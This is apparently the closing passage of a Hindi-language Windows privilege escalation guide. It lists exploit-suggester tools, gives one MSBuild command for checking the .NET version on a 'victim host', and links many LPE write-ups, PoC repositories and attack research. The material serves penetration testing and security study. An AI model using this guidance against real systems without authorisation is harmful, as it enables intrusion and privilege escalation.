[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** का output पढ़ता है और काम करने वाले exploits सुझाता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** का output पढ़ता है और काम करने वाले exploits सुझाता है (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको .NET के सही version का उपयोग करके project compile करना होगा ([यह देखें](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/))। Victim host पर installed .NET version देखने के लिए आप यह कर सकते हैं:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Privilege Escalation की मूल बातें](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [कमजोर folder permissions का exploit करके privileges बढ़ाना](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - एक cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - संपूर्ण OSCP गाइड](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation गाइड](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation चेकलिस्ट](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentesters के लिए Windows Privilege Escalation के तरीके](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP के ज़रिए Word VBA macro phishing → hMailServer credential decryption → SYSTEM तक पहुँचने के लिए Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) और kernel token चोरी](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox का पीछा: Kernel Shadows में बिल्ली और चूहे का खेल](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA System में मौजूद Privileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink का उपयोग](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [अतीत की ओर एक Link: Windows पर Symbolic Links का दुरुपयोग](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows पर ख़तरनाक Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules` folders से लोड करना](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist की चुनौतियाँ, हल सहित](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop के साथ Pwn2Own: Windows LPE के लिए CLDFLT और DirectX Kernel Race Conditions को chain करना](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [सभी पर राज करने वाली एक I/O Ring: Windows 11 पर Full Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Arbitrary File Deletes का दुरुपयोग करके Privilege Escalation और अन्य शानदार तरकीबें](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs का exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013, Windows 10 का Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager और Windows Vault की पड़ताल](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Image में बदलाव से Privilege Escalation कैसे होता है](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent से Ssh Private Keys निकालना](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Enterprise Update Servers को Backdoor Factories में बदलना (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Enterprise Update Servers को Backdoor Factories में बदलना (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Folder Delete Privilege Escalation](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: अपने कदमों के निशान पर चलते हुए NT AUTHORITY\SYSTEM तक वापस पहुँचना](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
